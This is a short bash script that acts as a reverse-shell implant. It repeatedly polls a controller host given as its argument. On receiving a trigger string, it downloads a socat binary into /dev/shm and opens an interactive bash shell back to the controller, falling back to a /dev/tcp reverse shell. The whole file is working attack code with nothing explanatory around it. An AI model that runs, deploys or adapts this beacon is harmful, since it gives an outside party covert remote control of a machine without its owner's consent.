#!/bin/bash


IP=$1
SOCAT_SHELL_PORT=4444
BACKUP_SHELL_PORT=4445
REVERSE_SHELL_CODE="Hello World!"

while true; do
    RESPONSE=$(curl -s http://$IP:6969)
    if [[ $RESPONSE == "" ]]; then
        echo "server down."
    else
        if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
            echo "STARTING REVERSE SHELL"
            # Get socat and create a reverse shell
            if [ ! type "socat" > /dev/null ] && [ nc -zw1 google.com 443 ]; then
                echo "getting socat.."
                wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat | echo "Couldn't fetch socat, defaulting to basic tcp tunnel." 
                chmod +x /dev/shm/socat
                alias socat=/dev/shm/socat
            fi
            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$SOCAT_SHELL_PORT || bash -i >& /dev/tcp/$IP/$BACKUP_SHELL_PORT 0>&1 || echo "Couldn't open reverse shell"
        else
            echo $RESPONSE
            echo "something else"
        fi
    fi
    sleep 10 
done

